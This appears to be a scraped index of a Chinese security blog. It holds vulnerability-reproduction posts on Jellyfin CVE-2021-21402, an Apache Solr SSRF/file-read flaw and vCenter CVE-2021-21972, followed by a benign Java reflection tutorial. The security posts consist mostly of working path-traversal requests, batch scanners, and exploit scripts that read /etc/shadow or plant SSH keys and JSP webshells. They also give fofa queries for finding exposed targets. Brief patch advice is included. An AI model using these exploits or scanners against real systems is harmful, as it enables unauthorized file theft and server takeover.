/Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ HTTP/1.1 Host: x.x.x.x:5577 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: */* Referer: http://110.93.247.208:5577/web/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close # poc_3 GET /Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/ HTTP/1.1 Host: xxx.xx.xx.xx.xx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: */* Referer: http://110.93.247.208:5577/web/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close # 其他poc GET /Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db HTTP/1.1 GET /Images/Ratings/c:%5ctemp/filename HTTP/1.1 GET /Videos/anything/hls/..%5Cdata%5Cjellyfin.db/stream.m3u8/?api_key=4c5750626da14b0a804977b09bf3d8f7 HTTP/1.1 批量检测脚本 import requests import os from urllib.parse import quote from requests.sessions import session os.system('') from requests.packages.urllib3.exceptions import InsecureRequestWarning # 禁用安全请求警告 requests.packages.urllib3.disable_warnings(InsecureRequestWarning) import argparse class poc(): def title(self): print(''' +-----------------------------------------------------------------+ 漏洞名称:CVE-2021-21402 Jellyfin任意文件读取 功能：单个检测，批量检测 单个检测：python poc.py -u url 批量检测：python poc.py -f 1.txt +-----------------------------------------------------------------+ ''') def exp(self, target_url, session): payload=input('请输入任意路径,默认请回车(例如：..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini)：') or '..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini' url = f\"{target_url}/Audio/1/hls/{quote(payload)}/stream.mp3/\" headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'} try: res = session.get(url=url, headers=headers, verify=False, timeout=10) return res except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def poc(self, target_url, session): payload='..\\data\\jellyfin.db' url = f\"{target_url}/Audio/1/hls/{quote(payload)}/stream.mp3/\" headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'} try: res = session.get(url=url, headers=headers, verify=False, timeout=10) return res except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def main(self, target_url, file): self.title() count=0 if target_url: session = requests.session() res=self.exp(target_url, session) if res.status_code==200 and res.text is not None: print(f'文件内容：{res.text}') if file: for url in file: count += 1 target_url = url.replace('\\n', '') #取消换行符 session = requests.session() res=self.poc(target_url, session) try: if res.status_code==200 and res.text is not None: print(f'\\033[31m[{count}] {target_url} 可能存在漏洞\\033[0m') else: print(f'[{count}] {target_url} 不存在漏洞') except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': parser = argparse.ArgumentParser() parser.add_argument('-u', '--url', type=str, default=False, help=\"目标地址，带上http://\") parser.add_argument(\"-f\", '--file', type=argparse.FileType('r'), default=False, help=\"批量检测，带上http://\") args = parser.parse_args() run = poc() run.main(args.url, args.file) ","date":"2021-04-13","objectID":"/jellyfin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-cve-2021-21402/:1:2","tags":["漏洞复现","Jellyfin"],"title":"Jellyfin任意文件读取漏洞复现(CVE-2021-21402)","uri":"/jellyfin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-cve-2021-21402/"},{"categories":["渗透测试"],"content":"修复建议： 更新版本。 在Web应用防火墙上添加防护规则。 ","date":"2021-04-13","objectID":"/jellyfin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-cve-2021-21402/:2:0","tags":["漏洞复现","Jellyfin"],"title":"Jellyfin任意文件读取漏洞复现(CVE-2021-21402)","uri":"/jellyfin%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-cve-2021-21402/"},{"categories":["渗透测试"],"content":"前言 Apache Solr是一个开源的搜索服务，使用Java语言开发，基于Lucene的全文搜索服务器。 Apache Solr全版本存在一个SSRF与任意文件读取漏洞，因Apache Solr整体默认安装为未授权，且大部分资产都为未授权，提供众多api接口，支持未授权用户通过config api更改配置文件，攻击面较大。建议相关用户及时采取措施阻止攻击。 影响范围 Apache Solr 所有版本 漏洞复现 fofa查询资产关键字： app=\"APACHE-Solr\" 1.首先访问目标url拼接下面的路径，获取实例对象的名称 /solr/admin/cores?indexInfo=false\u0026wt=json 如图，可以得到实例对象的名称为Tourist-guide-Server 2.构造路径 /solr/\".iii.\"/debug/dump?param=ContentStreams\u0026wt=json 其中iii就是我们前面得到的实例对象的名称 这里，我们构造之后为下面这个(这个地址作为post请求的地址)： /solr/Tourist-guide-Server/debug/dump?param=ContentStreams\u0026wt=json 而post数据中的body的内容为：stream.url=file:///etc/passwd 即(发送这个数据包)： POST /solr/Tourist-guide-Server/debug/dump?param=ContentStreams\u0026wt=json HTTP/1.1 Host: IP:PORT Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 29 stream.url=file:///etc/shadow 漏洞分析 略 EXP #!/usr/bin/env python3 # -*- coding:utf-8 -*- import requests import json import urllib import time import re def Getins(url): try: ins=\"\" url = url+\"solr/admin/cores?indexInfo=false\u0026wt=json\" response = requests.get(url=url) data = str(response.text) ins = re.findall(r'\\\"name\\\":\\\"(.+?)\\\",',data)[0] return(ins) except IndexError: return(\"\") def Getfile(url,ins,filename): try: url = url+\"solr/\"+ins+\"/debug/dump?param=ContentStreams\u0026wt=json\" headers ={ 'Content-Type': 'application/x-www-form-urlencoded' } payload = str(\"stream.url=file://\"+filename) response = requests.post(url=url,headers=headers,data=payload) data = str(response.text) test = re.findall(r'\\\"stream\\\":\\\"(.+?)\\\"\\}]',data)[0] print(test.replace(r\"\\n\",\"\\n\")) except IndexError: print(\"不能读取此文件\") if __name__ == '__main__': url = input(\"请输入测试地址:\") filename = input(\"请输入读取的文件路径:\") ins=Getins(url) if(ins == \"\"): print(\"不存在漏洞\") else: Getfile(url,ins,filename) 读取效果： ","date":"2021-03-22","objectID":"/apache-solr-ssrf%E4%B8%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":["漏洞复现","Solr"],"title":"Apache Solr SSRF与任意文件读取漏洞","uri":"/apache-solr-ssrf%E4%B8%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"简介 vSphere 是 VMware 推出的虚拟化平台套件，包含 ESXi、vCenter Server 等一系列的软件。其中 vCenter Server 为 ESXi 的控制中心，可从单一控制点统一管理数据中心的所有 vSphere 主机和虚拟机。 vSphere Client（HTML5） 在 vCenter Server 插件中存在一个远程执行代码漏洞。未授权的攻击者可以通过开放 443 端口的服务器向 vCenter Server 发送精心构造的请求，写入webshell，控制服务器。 ","date":"2021-02-25","objectID":"/cve-2021-21972-vsphere-client-rce%E5%A4%8D%E7%8E%B0/:1:0","tags":["CVE-2021-21972","漏洞复现","vCenter 6.5-7.0 RCE"],"title":"CVE-2021-21972 vSphere Client RCE复现","uri":"/cve-2021-21972-vsphere-client-rce%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"影响范围 vmware:vcenter_server 7.0 U1c 之前的 7.0 版本 vmware:vcenter_server 6.7 U3l 之前的 6.7 版本 vmware:vcenter_server 6.5 U3n 之前的 6.5 版本 ","date":"2021-02-25","objectID":"/cve-2021-21972-vsphere-client-rce%E5%A4%8D%E7%8E%B0/:2:0","tags":["CVE-2021-21972","漏洞复现","vCenter 6.5-7.0 RCE"],"title":"CVE-2021-21972 vSphere Client RCE复现","uri":"/cve-2021-21972-vsphere-client-rce%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"漏洞分析 我太菜了，还是搬运一下大佬的分析吧： http://noahblog.360.cn/vcenter-6-5-7-0-rce-lou-dong-fen-xi …此处省略一万字… 直接将tar解压的文件名与/tmp/unicorn_ova_dir拼接并写入文件，这里可以使用../绕过目录限制。 若目标为Linux环境，可以创建一个文件名为../../home/vsphere-ui/.ssh/authorized_keys的tar文件，上传后即可使用SSH连接服务器。 ","date":"2021-02-25","objectID":"/cve-2021-21972-vsphere-client-rce%E5%A4%8D%E7%8E%B0/:3:0","tags":["CVE-2021-21972","漏洞复现","vCenter 6.5-7.0 RCE"],"title":"CVE-2021-21972 vSphere Client RCE复现","uri":"/cve-2021-21972-vsphere-client-rce%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"POC https://github.com/QmF0c3UK/CVE-2021-21972-vCenter-6.5-7.0-RCE-POC/blob/main/CVE-2021-21972.py 该poc主要就是通过以下路径来进行判断, 如果返回405则表示该漏洞存在： /ui/vropspluginui/rest/services/uploadova POC代码如下： #!/usr/bin/python3 # -*- coding=utf-8 -*- #-*- coding:utf-8 -*- banner = \"\"\" 888888ba dP 88 `8b 88 a88aaaa8P' .d8888b. d8888P .d8888b. dP dP 88 `8b. 88' `88 88 Y8ooooo. 88 88 88 .88 88. .88 88 88 88. .88 88888888P `88888P8 dP `88888P' `88888P' ooooooooooooooooooooooooooooooooooooooooooooooooooooo @time:2021/02/24 CVE-2021-21972.py C0de by NebulabdSec - @batsu \"\"\" print(banner) import threadpool import random import requests import argparse import http.client import urllib3 import socket import socks socks.set_default_proxy(socks.SOCKS5, \"127.0.0.1\", 1080) socket.socket = socks.socksocket urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) http.client.HTTPConnection._http_vsn = 10 http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0' TARGET_URI = \"/ui/vropspluginui/rest/services/uploadova\" def get_ua(): first_num = random.randint(55, 62) third_num = random.randint(0, 3200) fourth_num = random.randint(0, 140) os_type = [ '(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)', '(X11; Linux x86_64)', '(Macintosh; Intel Mac OS X 10_12_6)' ] chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num) ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36', '(KHTML, like Gecko)', chrome_version, 'Safari/537.36'] ) return ua def CVE_2021_21972(url): # proxies = {\"scoks5\": \"http://127.0.0.1:1080\"} headers = { 'User-Agent': get_ua(), \"Content-Type\": \"application/x-www-form-urlencoded\" } targetUrl = url + TARGET_URI try: res = requests.get(targetUrl, headers=headers, timeout=15, verify=False) # proxies=proxies) # proxies={'socks5': 'http://127.0.0.1:1081'}) # print(len(res.text)) if res.status_code == 405: print(\"[+] URL:{}--------存在CVE-2021-21972漏洞\".format(url)) # print(\"[+] Command success result: \" + res.text + \"\\n\") with open(\"存在vmware漏洞地址.txt\", 'a+') as fw: fw.write(url + '\\n') else: print(\"[-] \" + url + \" 没有发现CVE-2021-21972漏洞.\\n\") # except Exception as e: # print(e) except: print(\"[-] \" + url + \" Request ERROR.\\n\") def multithreading(filename, pools=5): works = [] with open(filename, \"r\") as f: for i in f: func_params = [i.rstrip(\"\\n\")] # func_params = [i] + [cmd] works.append((func_params, None)) pool = threadpool.ThreadPool(pools) reqs = threadpool.makeRequests(CVE_2021_21972, works) [pool.putRequest(req) for req in reqs] pool.wait() def main(): parser = argparse.ArgumentParser() parser.add_argument(\"-u\", \"--url\", help=\"Target URL; Example:http://ip:port\") parser.add_argument(\"-f\", \"--file\", help=\"Url File; Example:url.txt\") # parser.add_argument(\"-c\", \"--cmd\", help=\"Commands to be executed; \") args = parser.parse_args() url = args.url # cmd = args.cmd file_path = args.file if url != None and file_path ==None: CVE_2021_21972(url) elif url == None and file_path != None: multithreading(file_path, 10) # 默认15线程 if __name__ == \"__main__\": main() ","date":"2021-02-25","objectID":"/cve-2021-21972-vsphere-client-rce%E5%A4%8D%E7%8E%B0/:4:0","tags":["CVE-2021-21972","漏洞复现","vCenter 6.5-7.0 RCE"],"title":"CVE-2021-21972 vSphere Client RCE复现","uri":"/cve-2021-21972-vsphere-client-rce%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"EXP https://blog.csdn.net/weixin_43650289/article/details/114055417 import tarfile import os from io import BytesIO import requests proxies = { \"http\": \"http://127.0.0.1:8080\", \"https\": \"http://127.0.0.1:8080\", } def return_zip(): with tarfile.open(\"test.tar\", 'w') as tar: payload = BytesIO() id_rsa_pub = 'ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAwgGuwNdSGHKvzHsHt7QImwwJ08Wa/+gHXOt+VwZTD23rLwCGVeYmfKObDY0uFfe2O4jr+sPamgA8As4LwdqtkadBPR+EzZB+PlS66RcVnUnDU4UdMhQjhyj/uv3pdtugugJpB9xaLdrUWwGoOLYA/djxD5hmojGdoYydBezsNhj2xXRyaoq3AZVqh1YLlhpwKnzhodk12a7/7EU+6Zj/ee5jktEwkBsVsDLTTWPpSnzK7r+kAHkbYx8fvO3Fk+9jlwadgbmhHJrpPr8gLEhwvrEnPcK1/j+QXvVkgy2cuYxl9GCUPv2wgZCN50f3wQlaJiektm2S9WkN5dLDdX+X4w==' # 针对Linux有效的方式 tarinfo = tarfile.TarInfo(name='../../../home/vsphere-ui/.ssh/authorized_keys') # Windows 需要改一下 #tarinfo = tarfile.TarInfo(name=\"..\\\\..\\\\ProgramData\\\\VMware\\\\vCenterServer\\\\data\\\\perfcharts\\\\tc-instance\\\\webapps\\\\statsreport\\\\test.jsp\") f1 = BytesIO(id_rsa_pub.encode()) tarinfo.size = len(f1.read()) f1.seek(0) tar.addfile(tarinfo, fileobj=f1) tar.close() payload.seek(0) def getshell(url): files = {'uploadFile':open('test.tar','rb')} try: r = requests.post(url=url, files=files,proxies=proxies,verify = False).text print(r) # windows下： # print('shell地址:/statsreport/test.jsp') except: print('flase') if __name__ == \"__main__\": try: return_zip() url=\"https://192.168.1.1/ui/vropspluginui/rest/services/uploadova\" getshell(url) except IOError as e: raise e 整合的POC\u0026EXP import requests import tarfile import sys import getopt requests.packages.urllib3.disable_warnings() proxy = {} def poc(target): url = (target + '/ui/vropspluginui/rest/services/uploadova').replace('//ui', '/ui') web = requests.get(url,verify=False,proxies=proxy) if web.status_code == 405: return True else: return False def payload_linux(filename, payload_type): payload_path = '../../home/vsphere-ui/.ssh/authorized_keys' if payload_type=='ssh' else '../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/%d/0/h5ngc.war/resources/test.jsp' payload_tar = tarfile.open('payload_linux.tar','w') for i in range(106): payload_tar.add(filename, arcname=payload_path % i) payload_tar.close() def payload_win(filename): payload_path = '../../ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport/test.jsp' payload_tar = tarfile.open('payload_win.tar','w') payload_tar.add(filename, arcname=payload_path) payload_tar.close() def send_payload(target, payload_type): url = (target + '/ui/vropspluginui/rest/services/uploadova').replace('//ui', '/ui') files = {'uploadFile': ('1.tar', open('payload_linux.tar', 'rb'), 'application/octet-stream')} web = requests.post(url, files=files,verify=False,proxies=proxy) if web.status_code == 200: if web.text == 'SUCCESS': if payload_type == 'ssh': print('\\t文件写入成功') if payload_type != 'ssh': webshell = (target + '/ui/resources/test.jsp').replace('//ui', '/ui') web = requests.get(webshell,verify=False,proxies=proxy) if web.status_code != 404: print('\\twebshell地址：%s' % webshell) return True files = {'uploadFile': ('1.tar', open('payload_win.tar', 'rb'), 'application/octet-stream')} web = requests.post(url, files=files,verify=False,proxies=proxy) if web.status_code == 200: if web.text == 'SUCCESS': print('\\t文件写入成功') webshell = (target + '/statsreport/test.jsp').replace('//statsreport', '/statsreport') web = requests.get(webshell,verify=False,proxies=proxy) if web.status_code != 404: print('\\twebshell地址：%s' % webshell) with open(\"webshell地址.txt\", \"a+\") as fff: fff.write('webshell地址：%s \\n' % webshell) return True return False def help(): print( \"\"\" Usage:CVE-2021-21972.py [option] -u or --url：目标url -t or --type：攻击方式（ssh/webshell) -f or --file：要上传的文件（webshell或authorized_keys） 例如：CVE-2021-21972.py -u https://127.0.0.1 -t webshell -f shell.jsp -p or --proxy：设置代理 例如：CVE-2021-21972.py -u https://127.0.0.1 -t webshell -f shell.jsp -p http://127.0.0.1:8080 -l or --list：批量检测 例如：CVE-2021-21972.py -l list.txt -t webshell -f shell.jsp \"\"\" ) if __name","date":"2021-02-25","objectID":"/cve-2021-21972-vsphere-client-rce%E5%A4%8D%E7%8E%B0/:5:0","tags":["CVE-2021-21972","漏洞复现","vCenter 6.5-7.0 RCE"],"title":"CVE-2021-21972 vSphere Client RCE复现","uri":"/cve-2021-21972-vsphere-client-rce%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"漏洞复现 1.fofa搜索title=\"+ ID_VC_Welcome +\" 可以用批量脚本通过fofa把所有搜索到的资产下载到本地 2.然后使用POC验证漏洞： 3.1 添加一个vsphere-ui用户： adduser vsphere-ui 3.2 生成 ssh密钥 ssh-keygen -t rsa # 然后复制公钥到上面的EXP中去 3.对于存在漏洞的资产，使用EXP上传tar文件 成功上传authorized_keys 4.ssh连接 也可以通过上传jsp小马等方式进行利用 ","date":"2021-02-25","objectID":"/cve-2021-21972-vsphere-client-rce%E5%A4%8D%E7%8E%B0/:6:0","tags":["CVE-2021-21972","漏洞复现","vCenter 6.5-7.0 RCE"],"title":"CVE-2021-21972 vSphere Client RCE复现","uri":"/cve-2021-21972-vsphere-client-rce%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"漏洞修复 vCenter Server7.0版本升级到7.0.U1c vCenter Server6.7版本升级到6.7.U3l vCenter Server6.5版本升级到6.5 U3n ","date":"2021-02-25","objectID":"/cve-2021-21972-vsphere-client-rce%E5%A4%8D%E7%8E%B0/:7:0","tags":["CVE-2021-21972","漏洞复现","vCenter 6.5-7.0 RCE"],"title":"CVE-2021-21972 vSphere Client RCE复现","uri":"/cve-2021-21972-vsphere-client-rce%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"参考 https://www.vmware.com/security/advisories/VMSA-2021-0002.html https://www.cnblogs.com/cHr1s/p/14445759.html http://noahblog.360.cn/vcenter-6-5-7-0-rce-lou-dong-fen-xi/ ","date":"2021-02-25","objectID":"/cve-2021-21972-vsphere-client-rce%E5%A4%8D%E7%8E%B0/:8:0","tags":["CVE-2021-21972","漏洞复现","vCenter 6.5-7.0 RCE"],"title":"CVE-2021-21972 vSphere Client RCE复现","uri":"/cve-2021-21972-vsphere-client-rce%E5%A4%8D%E7%8E%B0/"},{"categories":["Java学习"],"content":"Java反射机制概述 Reflection（反射）是被视为动态语言的关键，反射机制允许程序在执行期借助于Reflection API取得任何类的内部信息，并能直接操作任意对象的内部属性及方法。 加载完类之后，在堆内存的方法区中就产生了一个Class类型的对象（一个类只有一个Class对象），这个对象就包含了完整的类的结构信息。我们可以通过这个对象看到类的结构。这个对象就像一面镜子，透过这个镜子看到类的结构，所以，我们形象的称之为: 反射。 有了反射，就有了Java动态的特性 Java反射机制提供的功能： 在运行时判断任意一个对象所属的类 在运行时构造任意一个类的对象 在运行时判断任意一个类所具有的成员变量和方法 在运行时获取泛型信息 在运行时调用任意一个对象的成员变量和方法 在运行时处理注解 生成动态代理 反射相关的主要API； java.lang.Class:代表一个类 java.lang.reflect.Method:代表类的方法 java.lang.reflect.Field:代表类的成员变量 java.lang.reflect.Constructor:代表类的构造器 …… 反射代码： package cn.xpshuai.java1; import org.junit.Test; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.Method; /** * @author: 剑胆琴心 * @create: 2021-02-04 22:38 * @功能： * * 总结：公开的代码都不安全 * *疑问： 通过直接new对象的方式或反射的方式都可疑调用公共的结构，开发中到底用哪个？ * 建议用new的方法 * 什么时候会使用反射的方式。反射的特征:动态性 * * 疑问：反射机制与面向对象中的封装性是不是矛盾的呢？ *不矛盾，封装性是建议你调不调；反射解决的是能不能调 * * */ public class ReflectionTest { //反射之前，对于Person类的操作 @Test public void test(){ //1.实例化类对象 Person p1 = new Person(\"tom\", 12); //2.可以通过对象，调用内部属性、方法 p1.age = 10; System.out.println(p1); p1.setAge(11); System.out.println(p1); p1.show(); //在 Person类外部，不可以通过Person类的对象调用其内部私有结构(比如私有属性、私有方法、私有构造器等)。 } /* 反射之后，对于Person的操作 */ @Test public void test1() throws Exception { Class clazz = Person.class; //1.通过反射创建了Person类的对象 Constructor cons = clazz.getConstructor(String.class, int.class); Object obj = cons.newInstance(\"Tom\", 12); //造了个对象, 多态的形式 Person p = (Person)obj; //知道类型的话可以强转 System.out.println(p.toString()); // //2.通过反射，调用对象指定的属性、方法 //调属性 Field age = clazz.getDeclaredField(\"age\"); age.set(p, 18); System.out.println(p.toString()); //调用方法 Method show = clazz.getDeclaredMethod(\"show\"); show.invoke(p); //调用 System.out.println(\"*******************\"); //通过反射，可以调用Person类(运行时类)的私有结构（私有方法、私有属性、私有构造器） //调用私有构造器 Constructor cons1 = clazz.getDeclaredConstructor(String.class); cons1.setAccessible(true); Person p1 = (Person) cons1.newInstance(\"Jerry\"); System.out.println(p1); //调用私有属性 Field name = clazz.getDeclaredField(\"name\"); name.setAccessible(true); name.set(p1, \"hanmeimei\"); System.out.println(p1); //调用私有方法 Method na = clazz.getDeclaredMethod(\"showNation\", String.class); //方法名，咱叔 na.setAccessible(true); // na.invoke(p1, \"China\"); //调用 String nation = (String) na.invoke(p1, \"China\"); //接收返回值。调用, 相当于p1.show(\"China\") System.out.println(nation); } @Test public void test2(){ } @Test public void test3(){ } } package cn.xpshuai.java1; /** * @author: 剑胆琴心 * @create: 2021-02-04 22:38 * @功能： */ public class Person { private String name; public int age; public Person() { } public Person(String name, int age) { this.name = name; this.age = age; } private Person(String name) { this.name = name; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public void show(){ System.out.println(\"show方法\"); } private String showNation(String nation){ System.out.println(\"我的国籍是：\" + nation); return nation; } @Override public String toString() { return \"Person{\" + \"name='\" + name + '\\'' + \", age=\" + age + '}'; } } ","date":"2021-02-06","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%88%9D%E6%8E%A2/:0:1","tags":["Java学习笔记","Java反射","动态代理"],"title":"Java学习之反射初探","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%88%9D%E6%8E%A2/"},{"categories":["Java学习"],"content":"理解Class类并获取Class实例 对Class类的理解 * 关于java.lang.Class的理解： * Class clazz = Person.class; --\u003e反射的源头 * 1.类的加载过程 * 程序经过javac.exe命令以后，会生成一个或多个字节码文件(.class结尾)， * 接着我们使用java.exe命令对某个字节码文件进行解释运行。相当于将某个字节码文件加载到内存中，此过程就成为类的加载。 * 加载到内存中的类，我们就称为运行时类，此运行时类，就作为Class的一个实例 * （类本身也是对象，是Class的对象 ） * 换句话说，Class的实例就对应着一个运行时类 * 加载搭配内存中的运行时类，会缓存一定的时间，在此时间之内，我们可以通过不同的方式 来获取此运行时类 * * * * * --- 万事万物皆对象：对象.xxx, File, URK, 反射, 前端, 数据库操作 获取Class实例的4种方式 /* * 关于java.lang.Class的理解： * Class clazz = Person.class; --\u003e反射的源头 * 1.类的加载过程 * 程序经过javac.exe命令以后，会生成一个或多个字节码文件(.class结尾)， * 接着我们使用java.exe命令对某个字节码文件进行解释运行。相当于将某个字节码文件加载到内存中，此过程就成为类的加载。 * 加载到内存中的类，我们就称为运行时类，此运行时类，就作为Class的一个实例 * （类本身也是对象，是Class的对象 ） * 换句话说，Class的实例就对应着一个运行时类 * 加载搭配内存中的运行时类，会缓存一定的时间，在此时间之内，我们可以通过不同的方式 * 来获取此运行时类 * * --- 万事万物皆对象：对象.xxx, File, URK, 反射, 前端, 数据库操作 * * * 获取Class实例的4种方式，如下（前三种方式需要掌握） */ @Test public void test2() throws ClassNotFoundException { //方式1：调用运行时类的属性: .class Class\u003cPerson\u003e clazz = Person.class; //加上泛型 System.out.println(clazz); //方式2：通过运行时类的对象.调用getClass() Person p1 = new Person(); Class clazz2 = p1.getClass(); //方式3(使用最多)：调用Class的静态方法: forName(String classPath) Class clazz3 = Class.forName(\"cn.xpshuai.java1.Person\"); System.out.println(clazz == clazz2); // true //方式4(使用较少)：使用类的加载器：ClassLoader ClassLoader classLoader = ReflectionTest.class.getClassLoader(); Class clazz4 = classLoader.loadClass(\"cn.xpshuai.java1.Person\"); } 哪些类型可以有class对象? class: 外部类，成员(成员内部类，静态内部类)，局部内部类，匿名内部类 interface: 接口 []: 数组 enum: 枚举 annotation: 注解@interface primitive type:基本数据类型 void Class实例可以是哪些结构的说明： ","date":"2021-02-06","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%88%9D%E6%8E%A2/:0:2","tags":["Java学习笔记","Java反射","动态代理"],"title":"Java学习之反射初探","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%88%9D%E6%8E%A2/"},{"categories":["Java学习"],"content":"类的加载与ClassLoader的理解 类的加载过程： 例子： 类的加载器： 使用ClassLoader读取配置文件 /* Properties: 用来读取配置文件。 */ @Test public void test4() throws IOException { Properties pros = new Properties(); //此时的文件默认在当前的module下 //读取配置文件的方式1： // FileInputStream fis = new FileInputStream(\"jdbc.properties\"); // FileInputStream fis = new FileInputStream(\"src\\\\dbc.properties\"); // pros.load(fis); //加载输入流 //读取配置文件的方式2（常用）： //此时的文件默认在前的module下的src目录下 ClassLoader classLoader = ClassLoaderTest.class.getClassLoader(); InputStream is = classLoader.getResourceAsStream(\"jdbc.properties\"); pros.load(is); String user = pros.getProperty(\"user\"); String pass = pros.getProperty(\"pass\"); System.out.println(user + pass); } ","date":"2021-02-06","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%88%9D%E6%8E%A2/:0:3","tags":["Java学习笔记","Java反射","动态代理"],"title":"Java学习之反射初探","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%88%9D%E6%8E%A2/"},{"categories":["Java学习"],"content":"创建运行时类的对象（重点） 通过反射，创建对应的运行时类的对象: @Test public void test() throws IllegalAccessException, InstantiationException, ClassNotFoundException { Class clazz = Class.forName(\"cn.xpshuai.java1.Person\"); // newInstance(): 创建对应的运行时类的对象, 内部调用了运行时类的空参构造器 //要想此方法正常的创建运行时类的对象，要求： //1.运行时类必须提供空参的构造器 //2.空参的构造器的访问权限得够，通常设置为public //在javabean中要求提供一个public的空参构造器，原因： //1.便于通过反射，创建运行时类的对象 //2.便于子类继承此运行时类时，默认调用super()时，保证父类有此构造器 Object obj = clazz.newInstance(); System.out.println(obj); } 举例体会反射的动态性： //体会反射的动态性 @Test public void test1() throws IllegalAccessException, InstantiationException, ClassNotFoundException { int num = new Random().nextInt(3); // 0,1,2 String classPath = \"\"; switch (num){ case 0: classPath = \"java.util.Date\"; break; case 1: classPath = \"java.lang.Object\"; break; case 2: classPath = \"cn.xpshuai.java1.Person\"; break; } Object obj = getInstance(classPath); System.out.println(obj); } //此方法创建一个指定类的对象，classPath: 指定类的全类名 public Object getInstance(String classPath) throws ClassNotFoundException, IllegalAccessException, InstantiationException { Class clazz = Class.forName(classPath); return clazz.newInstance(); } ","date":"2021-02-06","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%88%9D%E6%8E%A2/:0:4","tags":["Java学习笔记","Java反射","动态代理"],"title":"Java学习之反射初探","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%88%9D%E6%8E%A2/"},{"categories":["Java学习"],"content":"获取运行时类的完整结构(了解即可) 先创建一下丰富的Person类的结构(java2包里面)： Person.java package cn.xpshuai.java2; import java.io.IOException; /** 提供结构更丰富的Person类 */ @MyAnnotation(value = \"Hi\") public class Person extends Creature\u003cString\u003e implements Comparable\u003cString\u003e,MyInterface{ private String name; int age; public int id; @MyAnnotation(value = \"abc\") public Person() { System.out.println(\"Person的空参构造器\"); } private Person(String name) { this.name = name; } Person(String name, int age) { this.name = name; this.age = age; } public String display(String interests, int age) throws IOException { return interests + age; } @MyAnnotation private void show(String nation){ System.out.println(\"show方法,我的国籍是：\" + nation); } @Override public String toString() { return \"Person{\" + \"name='\" + name + '\\'' + \", age=\" + age + '}'; } @Override public void info() { 